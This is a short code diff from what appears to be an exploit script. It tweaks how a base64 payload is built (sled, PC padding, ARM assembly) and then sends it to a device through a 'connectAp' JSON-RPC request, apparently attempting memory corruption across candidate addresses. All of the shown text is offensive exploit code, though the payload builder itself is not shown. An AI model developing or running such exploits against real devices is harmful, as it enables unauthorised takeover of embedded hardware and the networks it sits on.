@@ -144,7 +144,8 @@ def main():
                 try:
                     # build/params shell out to arm-none-eabi-as and can raise SystemExit,
                     # which is not an Exception — keep them inside the guard as well
-                    b64 = T.build(OFFSET, None, addr, sled=SLED, padpc=1, prefix=b"", bare=False, hang=True)
+                    b64 = T.build(OFFSET, None, addr, sled=SLED, padpc=1, prefix=b"", bare=False,
+                                  sledfill=True, pcround=0x1000, hang=True)
                     body = {"method": "connectAp",
                             "params": T.connect_params(b64, "Aardvark", "00:00:00:00:00:00")}
                     T.req(HOST, sess, body, timeout=8)
